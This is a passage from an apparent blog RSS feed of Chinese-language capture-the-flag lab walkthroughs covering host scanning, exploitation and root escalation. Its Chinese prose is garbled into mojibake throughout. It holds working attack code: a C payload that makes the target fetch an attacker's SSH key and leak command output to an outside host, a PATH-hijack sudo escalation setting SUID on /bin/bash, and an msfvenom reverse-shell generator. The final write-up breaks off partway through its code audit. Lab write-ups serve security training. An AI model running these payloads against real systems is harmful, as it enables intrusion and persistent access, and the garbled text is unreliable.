3. **Á≠âÂæÖCron JobÊâßË°å**ÔºöÁ≠âÂæÖÊúÄÂ§ö‰∏ÄÂàÜÈíüÔºå`crontab`‰∏≠ÁöÑÂÆöÊó∂‰ªªÂä°‰ºöËá™Âä®‰ª•`root`ÊùÉÈôêÊâßË°å`/usr/local/bin/flux_admin.sh`Ôºå‰ªéËÄå‰∏∫`/bin/bash`Ê∑ªÂä†SUIDÊùÉÈôê‰Ωç„ÄÇ

4. **Ëé∑ÂèñRoot Shell**ÔºöÊ£ÄÊü•`/bin/bash`ÊùÉÈôêÔºåÁ°ÆËÆ§SUID‰ΩçÂ∑≤ËÆæÁΩÆÂêéÔºåÊâßË°å`bash -p`Ëé∑ÂèñrootÊùÉÈôê„ÄÇ

   ```bash
   docbrown@hillvalley:/home/docbrown$ ls -al /bin/bash
   -rwsr-sr-x 1 root root 1265648 Apr 18 19:47 /bin/bash
   docbrown@hillvalley:/home/docbrown$ bash -p
   bash-5.2# id
   uid=1000(docbrown) gid=1001(marty) euid=0(root) egid=0(root) groups=0(root),1001(marty)
   ```

5. **ËØªÂèñÊúÄÁªàFlag**Ôºö

   ```bash
   bash-5.2# cat /root/root.txt /home/marty/user.txt 
   FLAG{1.21_gigawatts_of_root_power}
   FLAG{D3_L0r34n}
   ```

ÊàêÂäüÊèêÊùÉËá≥`root`ÔºåÊ∏óÈÄèÊµãËØïÂÆåÊàê„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/thl_BackToTheFutureI.html</guid><pubDate>Sat, 16 Aug 2025 05:11:22 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_Sysadmin</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Sysadmin.html</link><description># **‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ**

## **1. ‰∏ªÊú∫ÂèëÁé∞‰∏éÁ´ØÂè£Êâ´Êèè**

È¶ñÂÖàÔºåÂú®Êú¨Âú∞ÁΩëÁªú‰∏≠Âà©Áî® `arp-scan` Êâ´ÊèèÂ≠òÊ¥ª‰∏ªÊú∫ÔºåÂÆö‰ΩçÁõÆÊ†áIP„ÄÇÈöèÂêéÔºå‰ΩøÁî® `nmap` ÂØπÁõÆÊ†á‰∏ªÊú∫ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºå‰ª•ËØÜÂà´ÂÖ∂ÂºÄÊîæÁöÑÁ´ØÂè£‰∏éÊúçÂä°„ÄÇ

**‰∏ªÊú∫ÂèëÁé∞:**

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l
...
192.168.205.145 08:00:27:8f:61:6e       PCS Systemtechnik GmbH
...
```

ÈÄöËøáARPÊâ´ÊèèÔºåÁ°ÆËÆ§ÁõÆÊ†á‰∏ªÊú∫ÁöÑIPÂú∞ÂùÄ‰∏∫ `192.168.205.145`„ÄÇ

**Á´ØÂè£Êâ´Êèè:**

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p0-65535 192.168.205.145
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-14 22:40 EDT
Nmap scan report for 192.168.205.145
Host is up (0.00026s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:8F:61:6E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.21 seconds
```

NmapÁöÑÊâ´ÊèèÁªìÊûúÊòæÁ§∫ÔºåÁõÆÊ†á‰∏ªÊú∫ÂØπÂ§ñÂºÄÊîæ‰∫Ü **22 (SSH)** Âíå **80 (HTTP)** ‰∏§‰∏™TCPÁ´ØÂè£„ÄÇ

# **‰∫å„ÄÅÊºèÊ¥ûÂèëÁé∞‰∏éÂàùÂßãËÆøÈóÆ**

## **1. WebÊúçÂä°‰æ¶ÂØü‰∏éÊºèÊ¥ûÂàÜÊûê**

ÈÄöËøáÊµèËßàÂô®ËÆøÈóÆ `http://192.168.205.145`ÔºåÂèëÁé∞‰∏Ä‰∏™Êèê‰æõCËØ≠Ë®ÄÂú®Á∫øÁºñËØëÂíåÊâßË°åÂäüËÉΩÁöÑWebÂ∫îÁî®„ÄÇÈÄöËøáÂÆ°Êü•È°µÈù¢Ê∫ê‰ª£Á†ÅÊ≥®ÈáäÔºåÊàë‰ª¨Ëé∑Âèñ‰∫ÜÂÖ∂ÂêéÁ´ØÁöÑÁºñËØëÊåá‰ª§Ôºö

```
gcc -std=c11 -nostdinc -I/var/www/include -z execstack -fno-stack-protector -no-pie test.c -o a.out
```

Ê≠§ÁºñËØëÂëΩ‰ª§‰∏≠ÂåÖÂê´‰∏Ä‰∏™ÂÖ≥ÈîÆÂèÇÊï∞ `-nostdinc`„ÄÇËØ•ÂèÇÊï∞ÁöÑ‰ΩúÁî®ÊòØÈòªÊ≠¢ÁºñËØëÂô®ÈìæÊé•‰ªª‰ΩïÊ†áÂáÜÂ∫ìÁöÑÂ§¥Êñá‰ª∂Ôºà‰æãÂ¶Ç `stdio.h`, `unistd.h` Á≠âÔºâ„ÄÇËøôÊÑèÂë≥ÁùÄÔºåÊâÄÊúâ‰æùËµñÊ†áÂáÜÂ∫ìÂáΩÊï∞ÔºàÂ¶Ç `system()`, `fork()`, `execve()`ÔºâÁöÑÂ∏∏ËßÑÂèçÂºπShell PayloadÂùá‰ºöÂõ†ÈìæÊé•Â§±Ë¥•ËÄåÊó†Ê≥ïÈÄöËøáÁºñËØëÔºåÂ∏∏ËßÑÁöÑÊîªÂáªÊñπÂºèÂú®Ê≠§Â§ÑÂ§±Êïà„ÄÇ

## **2. ÁªïËøáÁºñËØëÈôêÂà∂Ëé∑ÂèñShell**

‰∏∫‰∫ÜÊàêÂäüÁªïËøá `-nostdinc` ÂèÇÊï∞Â∏¶Êù•ÁöÑÈôêÂà∂ÔºåÊàë‰ª¨‰∏çËÉΩ‰æùËµñCËØ≠Ë®ÄÁöÑÂ∫ìÂáΩÊï∞ÔºåËÄåÂøÖÈ°ªËΩ¨ÂêëÊõ¥Â∫ïÂ±ÇÁöÑÂÆûÁé∞ÊñπÂºèÔºöÈÄöËøáÂÜÖËÅîÊ±áÁºñÁõ¥Êé•ÊâßË°åÁ≥ªÁªüË∞ÉÁî®ÔºàsyscallÔºâ„ÄÇ

**ÊîªÂáªÊÄùË∑ØÂ¶Ç‰∏ãÔºö**
ÊûÑÈÄ†‰∏Ä‰∏™ÁâπÊÆäÁöÑCËØ≠Ë®ÄPayloadÔºåÂÖ∂Ê†∏ÂøÉÊòØÂà©Áî®ÂÜÖËÅîÊ±áÁºñÁõ¥Êé•Ë∞ÉÁî® `execve` Á≥ªÁªüË∞ÉÁî®Êù•ÊâßË°å‰ªªÊÑèÂëΩ‰ª§„ÄÇËØ•ÂëΩ‰ª§Â∞ÜÊåáÁ§∫ÁõÆÊ†áÊúçÂä°Âô®‰ªéÊàë‰ª¨ÁöÑÊîªÂáªÊú∫‰∏ä‰∏ãËΩΩÈ¢ÑÂÖàÂáÜÂ§áÂ•ΩÁöÑSSHÂÖ¨Èí•ÔºåÂπ∂Â∞ÜÂÖ∂ÂÜôÂÖ•ÁõÆÊ†áÁî®Êà∑ `echo` ÁöÑ `~/.ssh/authorized_keys` Êñá‰ª∂‰∏≠Ôºå‰ªéËÄå‰∏∫Êàë‰ª¨Âª∫Á´ã‰∏Ä‰∏™ÊåÅ‰πÖÂåñÁöÑSSHÂÖçÂØÜÁôªÂΩïÈÄöÈÅì„ÄÇÔºàËøôÈáåÈúÄË¶ÅÊ≥®ÊÑèÔºåSublargeËÆæÁΩÆ‰∫Ütimeout 3sÔºåÊâÄ‰ª•Â∞ΩÈáèÂÜôauthorized_keysÔºåÊàñËÄÖ‰ΩøÁî®SublargeÁöÑÊÄùË∑ØÔºâ

*ps:SublargeÁöÑÂäûÊ≥ïÂú®ÊñáÊú´*

**Payload (`exploit.c`):**

```c
long syscall(long num, long p1, long p2, long p3);

int main() {
    char *sh = '/bin/bash';
    char *arg1 = 'bash';
    char *arg2 = '-c';
    char *cmd = 'mkdir -p ~/.ssh &amp;&amp; busybox wget http://192.168.205.128/authorized_keys -O ~/.ssh/authorized_keys &amp;&amp; chmod 700 ~/.ssh &amp;&amp; chmod 600 ~/.ssh/authorized_keys &amp;&amp; busybox wget http://192.168.205.128:80?$(whoami)';

    const long SYS_EXECVE = 59;

    
    char *argv[] = {arg1, arg2, cmd, 0};

    syscall(SYS_EXECVE, (long)sh, (long)argv, 0);

    
    while(1) {
        syscall(37, 0, 0, 0);
    }

    return 0;
}

long syscall(long num, long p1, long p2, long p3) {
    long ret;
    __asm__ volatile (
        'movq %1, %%rax\n'
        'movq %2, %%rdi\n'
        'movq %3, %%rsi\n'
        'movq %4, %%rdx\n'
        'syscall\n'
        'movq %%rax, %0\n'
        : '=m'(ret)
        : 'm'(num), 'm'(p1), 'm'(p2), 'm'(p3)
        : 'rax', 'rdi', 'rsi', 'rdx'
    );
    return ret;
}
```

**ÊâßË°åÊ≠•È™§Ôºö**

1. Âú®ÊîªÂáªÊú∫Ôºà`192.168.205.128`Ôºâ‰∏äÁîüÊàêSSHÂØÜÈí•ÂØπÔºåÂ∞ÜÂÖ¨Èí•ÂÜÖÂÆπ‰øùÂ≠ò‰∏∫ `authorized_keys` Êñá‰ª∂ÔºåÂπ∂‰∫éÊñá‰ª∂ÊâÄÂú®ÁõÆÂΩïÂêØÂä®‰∏Ä‰∏™‰∏¥Êó∂ÁöÑHTTPÊúçÂä°„ÄÇ

   ```bash
   ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
   ‚îî‚îÄ$ python3 -m http.server 80
   Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
   ```

2. Â∞Ü‰∏äËø∞ `exploit.c` ÁöÑ‰ª£Á†ÅÁ≤òË¥¥Âà∞ÁõÆÊ†áWebÂ∫îÁî®ÁöÑËæìÂÖ•Ê°Ü‰∏≠ÔºåÂπ∂Êèê‰∫§ÊâßË°å„ÄÇ

3. ËßÇÂØüÊîªÂáªÊú∫‰∏äHTTPÊúçÂä°ÁöÑÊó•ÂøóÔºåÁ°ÆËÆ§Êñá‰ª∂‰∏ãËΩΩÂíåÂëΩ‰ª§ÊâßË°åÊÉÖÂÜµ„ÄÇ

   ```
   192.168.205.145 - - [14/Aug/2025 23:06:01] 'GET /authorized_keys HTTP/1.1' 200 -
   192.168.205.145 - - [14/Aug/2025 23:06:01] 'GET /?echo HTTP/1.1' 404 -
   ```

   Êó•ÂøóÊ∏ÖÊô∞Âú∞ÊòæÁ§∫ÔºåÁõÆÊ†á‰∏ªÊú∫È¶ñÂÖàÊàêÂäüËØ∑Ê±Ç‰∫Ü `authorized_keys` Êñá‰ª∂„ÄÇÈöèÂêéÔºåÁ¨¨‰∫å‰∏™ËØ∑Ê±ÇÁöÑË∑ØÂæÑ‰∏≠ÂåÖÂê´‰∫Ü `echo` Â≠óÁ¨¶‰∏≤ÔºåËøôÊòØ `whoami` ÂëΩ‰ª§ÊâßË°åÁªìÊûúÁöÑÂõûÊòæÔºå‰ªéËÄåÁ°ÆËÆ§‰∫ÜWebÊúçÂä°ÁöÑËøêË°åÁî®Êà∑‰∏∫ `echo`„ÄÇ

## **3. Ëé∑ÂèñÂàùÂßãËÆøÈóÆÊùÉÈôê**

Êó¢ÁÑ∂SSHÂÖ¨Èí•Â∑≤ÊàêÂäüÈÉ®ÁΩ≤Âà∞ÁõÆÊ†á‰∏ªÊú∫ `echo` Áî®Êà∑ÁöÑÂÆ∂‰∏≠ÔºåÁé∞Âú®Êàë‰ª¨ÂèØ‰ª•‰ΩøÁî®ÂØπÂ∫îÁöÑÁßÅÈí•Áõ¥Êé•ËøõË°åSSHÁôªÂΩï„ÄÇ

```bash
ssh echo@192.168.205.145
```

ÊàêÂäüÁôªÂΩïÂêéÔºåÈÄöËøá `id` ÂëΩ‰ª§È™åËØÅÂΩìÂâçÁî®Êà∑Ë∫´‰ªΩ„ÄÇ

```bash
echo@Sysadmin:~$ id
uid=1000(echo) gid=1000(echo) groups=1000(echo)
```

Ëá≥Ê≠§ÔºåÊàë‰ª¨Â∑≤ÊàêÂäüËé∑Âèñ‰∫ÜÁî®Êà∑ `echo` ÁöÑ‰∫§‰∫íÂºèShellÔºåÂÆåÊàê‰∫ÜÂàùÂßãËÆøÈóÆ„ÄÇ

# **‰∏â„ÄÅÊùÉÈôêÊèêÂçá**

## **1. SudoÊùÉÈôêÊûö‰∏æ**

Âú®Ëé∑ÂæóÂàùÂßãÁ´ãË∂≥ÁÇπÂêéÔºåÈ¶ñË¶Å‰ªªÂä°ÊòØÊé¢Êü•ÊòØÂê¶Â≠òÂú®ÊùÉÈôêÊèêÂçáÁöÑË∑ØÂæÑ„ÄÇÊàë‰ª¨Ê£ÄÊü•ÂΩìÂâçÁî®Êà∑ `echo` ÁöÑ `sudo` ÈÖçÁΩÆ„ÄÇ

```bash
echo@Sysadmin:~$ sudo -l
Matching Defaults entries for echo on Sysadmin:
    !env_reset, mail_badpass, !env_reset, always_set_home

User echo may run the following commands on Sysadmin:
    (root) NOPASSWD: /usr/local/bin/system-info.sh
```

`sudo -l` ÁöÑËæìÂá∫Êè≠Á§∫‰∫ÜÂÖ≥ÈîÆ‰ø°ÊÅØÔºö

1.  **`!env_reset`**ÔºöËøôÊòØ‰∏Ä‰∏™ÈùûÂ∏∏ÈáçË¶ÅÁöÑÂÆâÂÖ®ÈÖçÁΩÆ„ÄÇÂÆÉÂëäÁü•Êàë‰ª¨ÔºåÂΩì `echo` Áî®Êà∑‰ΩøÁî® `sudo` ÊâßË°åÂëΩ‰ª§Êó∂ÔºåÁ≥ªÁªü**‰∏ç‰ºö**ÈáçÁΩÆÂ§ßÈÉ®ÂàÜÁî®Êà∑ÁöÑÁéØÂ¢ÉÂèòÈáèÔºåÂÖ∂‰∏≠Â∞±ÂåÖÊã¨ `PATH` ÁéØÂ¢ÉÂèòÈáè„ÄÇËøô‰∏™ÁâπÊÄßÊòØÊú¨Ê¨°ÊèêÊùÉÊºèÊ¥ûÁöÑÊ†∏ÂøÉ„ÄÇ
2.  **(root) NOPASSWD: /usr/local/bin/system-info.sh**ÔºöÁî®Êà∑ `echo` ÂèØ‰ª•Êó†ÈúÄÂØÜÁ†ÅÔºå‰ª• `root` ÊùÉÈôêÊâßË°å `/usr/local/bin/system-info.sh` Ëøô‰∏™ËÑöÊú¨„ÄÇ

## **2. PATHÁéØÂ¢ÉÂèòÈáèÂä´ÊåÅ**

Êé•‰∏ãÊù•ÔºåÊàë‰ª¨ÂÆ°ËÆ°ËØ•ËÑöÊú¨ÁöÑÊ∫ê‰ª£Á†ÅÔºå‰ª•ÂàÜÊûêÊòØÂê¶Â≠òÂú®ÂèØÂà©Áî®ÁöÑÁº∫Èô∑„ÄÇ

```bash
echo@Sysadmin:~$ cat /usr/local/bin/system-info.sh
#!/bin/bash
#===================================
# Daily System Info Report
#===================================
echo 'Starting daily system information collection at $(date)'
echo '------------------------------------------------------'
echo 'Checking disk usage...'
df -h
echo 'Checking log directory...'
ls -lh /var/log/
find /var/log/ -type f -name '*.gz' -mtime +30 -exec rm {} \;
echo 'Checking critical services...'
systemctl is-active sshd
systemctl is-active cron
echo 'Collecting CPU and memory information...'
cat /proc/cpuinfo
free -m
echo '------------------------------------------------------'
echo 'Report complete at $(date)'
```

‰ª£Á†ÅÂÆ°ËÆ°ÂèëÁé∞ÔºåËÑöÊú¨‰∏≠Ë∞ÉÁî®ÁöÑ `df`, `ls`, `find`, `systemctl`, `cat`, `free` Á≠â‰∏ÄÁ≥ªÂàóÂëΩ‰ª§ÂùáÊú™‰ΩøÁî®ÂÖ∂ÁªùÂØπË∑ØÂæÑÔºàÂ¶Ç `/bin/df`ÔºâÔºåËÄåÊòØÁõ¥Êé•‰ΩøÁî®Áõ∏ÂØπË∑ØÂæÑ„ÄÇÁªìÂêàÂâçËø∞ÁöÑ `!env_reset` ÈÖçÁΩÆÔºå‰∏Ä‰∏™ÁªèÂÖ∏ÁöÑ**PATHÁéØÂ¢ÉÂèòÈáèÂä´ÊåÅ**ÊîªÂáªË∑ØÂæÑÂ∞±Ê≠§ÂΩ¢Êàê„ÄÇÂΩìËÑöÊú¨‰ª• `root` ÊùÉÈôêËøêË°åÊó∂ÔºåÂÆÉ‰ºö‰æùÊçÆ `echo` Áî®Êà∑Ëá™ÂÆö‰πâÁöÑ `PATH` ÁéØÂ¢ÉÂèòÈáèÊù•Êü•ÊâæËøô‰∫õÂëΩ‰ª§„ÄÇ

## **3. ÊèêÊùÉËá≥Root**

**ÊîªÂáªÊ≠•È™§Ôºö**

1. È¶ñÂÖàÔºåÂú® `echo` Áî®Êà∑ÁöÑÂÆ∂ÁõÆÂΩï‰∏ãÂàõÂª∫‰∏Ä‰∏™Âêç‰∏∫ `df` ÁöÑÊÅ∂ÊÑèËÑöÊú¨„ÄÇÊàë‰ª¨ÁöÑÁõÆÊ†áÊòØÂà©Áî® `root` ÊùÉÈôê‰∏∫ `/bin/bash` Á®ãÂ∫èËµã‰∫àSUIDÊùÉÈôê‰ΩçÔºå‰ªéËÄåÂàõÂª∫‰∏Ä‰∏™ 'root shellÂêéÈó®'„ÄÇ

   ```bash
   echo@Sysadmin:~$ echo '#!/bin/bash' &gt; df
   echo@Sysadmin:~$ echo 'chmod +s /bin/bash' &gt;&gt; df
   echo@Sysadmin:~$ chmod +x df
   ```

2. Êé•ÁùÄÔºå‰øÆÊîπ `PATH` ÁéØÂ¢ÉÂèòÈáèÔºåÂ∞ÜÂΩìÂâçÁõÆÂΩïÔºà`.`ÔºâÊ∑ªÂä†Âà∞ÂÖ∂ÊúÄÂâçÁ´Ø„ÄÇËøôÊ†∑‰∏ÄÊù•ÔºåÂΩìÁ≥ªÁªüÊü•Êâæ `df` ÂëΩ‰ª§Êó∂Ôºå‰ºö‰ºòÂÖàÂú®Êàë‰ª¨ÂàõÂª∫ÁöÑÊÅ∂ÊÑèËÑöÊú¨ÊâÄÂú®ÁõÆÂΩï‰∏≠ÊâæÂà∞Âπ∂ÊâßË°åÂÆÉ„ÄÇ

   ```bash
   echo@Sysadmin:~$ export PATH=.:$PATH
   ```

3. ‰∏á‰∫ã‰ø±Â§áÔºå‰ª• `root` ÊùÉÈôêÊâßË°åÁõÆÊ†áËÑöÊú¨ÔºåËß¶ÂèëÊàë‰ª¨ÁöÑPayload„ÄÇ

   ```bash
   echo@Sysadmin:~$ sudo -u root /usr/local/bin/system-info.sh
   ```

   ËÑöÊú¨Âú®ÊâßË°åÂà∞ `df -h` Êó∂Ôºå‰ºöË∞ÉÁî®Êàë‰ª¨‰º™ÈÄ†ÁöÑ `df` Á®ãÂ∫èÔºå‰ªéËÄå‰ª• `root` ÊùÉÈôêÊâßË°å‰∫Ü `chmod +s /bin/bash`„ÄÇ

4. È™åËØÅ `/bin/bash` ÁöÑÊùÉÈôêÔºåÁ°ÆËÆ§SUID‰ΩçÊòØÂê¶Â∑≤ÊàêÂäüËÆæÁΩÆ„ÄÇ

   ```bash
   echo@Sysadmin:~$ ls -al /bin/bash
   -rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
   ```

   ÊùÉÈôê‰Ωç‰∏≠ÁöÑ `s` ÊòéÁ°ÆË°®Á§∫SUID‰ΩçËÆæÁΩÆÊàêÂäü„ÄÇ

5. ÊúÄÂêéÔºåÂà©Áî®Ëøô‰∏™Â∏¶ÊúâSUIDÊùÉÈôêÁöÑ `bash` Êù•Ëé∑Âèñ `root` Shell„ÄÇ`-p` ÂèÇÊï∞Áî®‰∫éÁ°Æ‰øù`bash`Âú®ÂêØÂä®Êó∂‰∏ç‰ºöÂõ†‰∏∫ÂÆâÂÖ®ÂéüÂõ†ÊîæÂºÉÁî±SUIDËé∑ÂæóÁöÑÊúâÊïàÁî®Êà∑IDÔºàEUIDÔºâ„ÄÇ

   ```bash
   echo@Sysadmin:~$ bash -p
   bash-5.0# id
   uid=1000(echo) gid=1000(echo) euid=0(root) egid=0(root) groups=0(root),1000(echo)
   ```

   `euid=0(root)` ÁöÑËæìÂá∫Á°ÆËÆ§Êàë‰ª¨Â∑≤ÊàêÂäüÊèêÊùÉËá≥ `root` Áî®Êà∑„ÄÇ

## **4. Ëé∑ÂèñFlag**

ÊàêÂäüËé∑ÂæóÊúÄÈ´òÊùÉÈôêÂêéÔºåËØªÂèñÂπ∂Êèê‰∫§ÊâÄÊúâÁöÑflagÊñá‰ª∂„ÄÇ

```bash
bash-5.0# cat /root/root.txt /home/echo/user.txt
flag{root-8b8a8b353298f798e3eb8628661617b6}
flag{user-9592f6e02a7abaf9e38c0ef43e868cf3}
```

Ê∏óÈÄèÊµãËØïËá≥Ê≠§È°∫Âà©ÂÆåÊàê„ÄÇ

# SublargeÊÄùË∑Ø

**Sublarge Payload (`a.sh`):**

```c
#!/usr/bin/env bash
LHOST='192.168.56.10'
LPORT='4444'
OUT_C='test.c'

# 1. ÁîüÊàêÂéüÂßã shellcode
msfvenom -p linux/x64/shell_reverse_tcp \
         LHOST='$LHOST' LPORT='$LPORT' \
         -f raw 2&gt;/dev/null &gt; /tmp/rev.raw
[[ -s /tmp/rev.raw ]] || { echo '[-] msfvenom failed'; exit 1; }

# 2. Áî®ÂçÅÂÖ≠ËøõÂà∂Ê†ºÂºèËæìÂá∫
SC_HEX=$(xxd -p -c 1 /tmp/rev.raw | sed 's/^/0x/' | paste -sd',' -)

# 3. ÂÜô C Êñá‰ª∂ÔºöÂ≠êËøõÁ®ãÂêéÂè∞ÊâßË°å
cat &gt; '$OUT_C' &lt;&lt;EOF
int fork(void);
int execve(const char *p,char *const a[],char *const e[]);

int main(void)
{
    if (fork() == 0) {
        unsigned char sc[] = {$SC_HEX};
        ((void(*)())sc)();
    }
    return 0;
}
EOF

echo '[+] Generated $OUT_C (forked)'
```

**ÊâßË°åÊ≠•È™§Ôºö**

1. ËøêË°åa.sh
2. Â∞ÜÁîüÊàêÁöÑtest.c‰∏ä‰º†Âà∞ÊúçÂä°Âô®
3. ÁõëÂê¨sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Sysadmin.html</guid><pubDate>Sat, 16 Aug 2025 01:25:57 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_tpN</title><link>https://7r1UMPHK.github.io/post/nei-bu-_tpN.html</link><description># ‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ

## 1. ‰∏ªÊú∫ÂèëÁé∞

È¶ñÂÖàÔºåÂú®ÂΩìÂâçÁΩëÊÆµÂÜÖËøõË°å‰∏ªÊú∫ÂèëÁé∞ÔºåÁ°ÆÂÆöÁõÆÊ†áIPÂú∞ÂùÄ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l           
...
192.168.205.131 08:00:27:2b:fe:37       PCS Systemtechnik GmbH
...
```

ÂèëÁé∞Â≠òÊ¥ª‰∏ªÊú∫ `192.168.205.131`„ÄÇ

## 2. Á´ØÂè£Êâ´Êèè

‰ΩøÁî® Nmap ÂØπÁõÆÊ†á‰∏ªÊú∫ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºå‰ª•ËØÜÂà´ÂºÄÊîæÁöÑÊúçÂä°„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p0-65535 192.168.205.131
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-15 20:21 EDT
Nmap scan report for 192.168.205.131
Host is up (0.00017s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
MAC Address: 08:00:27:2B:FE:37 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
...
```

Êâ´ÊèèÁªìÊûúÊòæÁ§∫ÁõÆÊ†áÂºÄÊîæ‰∫Ü‰∏§‰∏™Á´ØÂè£Ôºö

*   **22/tcp**: SSH ÊúçÂä°
*   **8080/tcp**: HTTP ÊúçÂä°

# ‰∫å„ÄÅWebÊ∏óÈÄè

## 1. WebÂ∫îÁî®ËØÜÂà´

ËÆøÈóÆ `http://192.168.205.131:8080`ÔºåÈ°µÈù¢ÊòæÁ§∫‰∏∫‰∏Ä‰∏™ËµõÂçöÊúãÂÖãÈ£éÊ†ºÁöÑÁΩëÁ´ô„ÄÇ

```html
&lt;body&gt;
    &lt;h1&gt;Ê¨¢ËøéÊù•Âà∞ËµõÂçöÊúãÂÖã‰∏ñÁïå&lt;/h1&gt;
    &lt;p&gt;ËøôÊòØ‰∏Ä‰∏™‰ΩøÁî®ThinkPHPÊûÑÂª∫ÁöÑËµõÂçöÊúãÂÖãÈ£éÊ†ºÁöÑRCE„ÄÇ&lt;/p&gt;
    ...
&lt;/body&gt;
```

È°µÈù¢ÊòéÁ°ÆÊåáÂá∫ËØ•Â∫îÁî®ÊòØ‰ΩøÁî® **ThinkPHP** Ê°ÜÊû∂ÊûÑÂª∫ÁöÑ„ÄÇ

## 2. ÁõÆÂΩï‰∏éÊºèÊ¥ûÊâ´Êèè

‰ΩøÁî® `gobuster` ËøõË°åÁõÆÂΩïÊâ´ÊèèÔºåÂèëÁé∞Â§ßÈáèÊñá‰ª∂Ôºå‰ΩÜ‰ø°ÊÅØËæÉ‰∏∫ÊùÇ‰π±„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.131:8080 -w ...
...
/index.php            (Status: 200) [Size: 2295]
/robots.txt           (Status: 200) [Size: 24]
/system.zip           (Status: 200) [Size: 22]
...
```

‰ΩøÁî® `nuclei` ËøõË°åËá™Âä®ÂåñÊºèÊ¥ûÊâ´ÊèèÔºåÂèëÁé∞ `phpinfo.php` Ê≥ÑÈú≤Âíå `.gitignore` Êñá‰ª∂„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nuclei -u http://192.168.205.131:8080
...
[phpinfo-files] [http] [low] http://192.168.205.131:8080/phpinfo.php ...
[exposed-gitignore] [http] [info] http://192.168.205.131:8080/.gitignore
...
```

ËÆøÈóÆ `.gitignore` Êñá‰ª∂ÔºåÂèëÁé∞‰∫Ü‰∏Ä‰∫õË¢´ÊéíÈô§Âú®ÁâàÊú¨ÊéßÂà∂‰πãÂ§ñÁöÑË∑ØÂæÑÂíåÊñá‰ª∂ÔºåÂ¶Ç `.env` Âíå `/vendor` ÁõÆÂΩïÔºåËøô‰∫õÈÄöÂ∏∏ÂåÖÂê´ÊïèÊÑü‰ø°ÊÅØ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl http://192.168.205.131:8080/.gitignore          
*.log
.env
composer.phar
...
/vendor
...
```

Â∞ùËØïËÆøÈóÆ `.env` Êñá‰ª∂ÔºåËôΩÁÑ∂Ê≤°ÊúâÁõ¥Êé•Ëé∑ÂèñÂà∞ÈÖçÁΩÆ‰ø°ÊÅØÔºå‰ΩÜËøîÂõûÁöÑÈîôËØØÈ°µÈù¢Êö¥Èú≤‰∫ÜÊ°ÜÊû∂ÁöÑËØ¶ÁªÜÁâàÊú¨Ôºö**ThinkPHP V8.1.3**„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl http://192.168.205.131:8080/.env
...
&lt;div class='copyright'&gt;
    &lt;a title='ÂÆòÊñπÁΩëÁ´ô' href='http://www.thinkphp.cn'&gt;ThinkPHP&lt;/a&gt; 
    &lt;span&gt;V8.1.3&lt;/span&gt; 
    ...
&lt;/div&gt;
...
```

## 3. GitÊ∫êÁ†ÅÊ≥ÑÈú≤

‰ΩøÁî® `dirsearch` Ëøõ‰∏ÄÊ≠•Êâ´ÊèèÔºåÁ°ÆËÆ§‰∫Ü `.git` ÁõÆÂΩïÁöÑÂ≠òÂú®ÔºåËøôÊÑèÂë≥ÁùÄÁΩëÁ´ôÊ∫êÁ†ÅÂèØËÉΩË¢´Ê≥ÑÈú≤„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ dirsearch -u http://192.168.205.131:8080  
...
[20:35:40] 301 -  324B  - /.git  -&gt;  http://192.168.205.131:8080/.git/
...
```

‰ΩøÁî® `git-dumper` Â∑•ÂÖ∑Â∞ÜÊ≥ÑÈú≤ÁöÑ `.git` ‰ªìÂ∫ìÂÆåÊï¥‰∏ãËΩΩÂà∞Êú¨Âú∞„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ git-dumper http://192.168.205.131:8080/ .                
...
[-] Running git checkout .
‰ªéÁ¥¢ÂºïÂå∫Êõ¥Êñ∞‰∫Ü 71 ‰∏™Ë∑ØÂæÑ
```

## 4. ‰ª£Á†ÅÂÆ°ËÆ°

‰∏ãËΩΩÊ∫êÁ†ÅÂêéÔºåÂØπÂÖ≥ÈîÆÊñá‰ª∂ËøõË°åÂÆ°ËÆ°ÔºåÂØªÊâæÊºèÊ¥û„ÄÇ

* **`app/admin/controller/Admin.php`**:
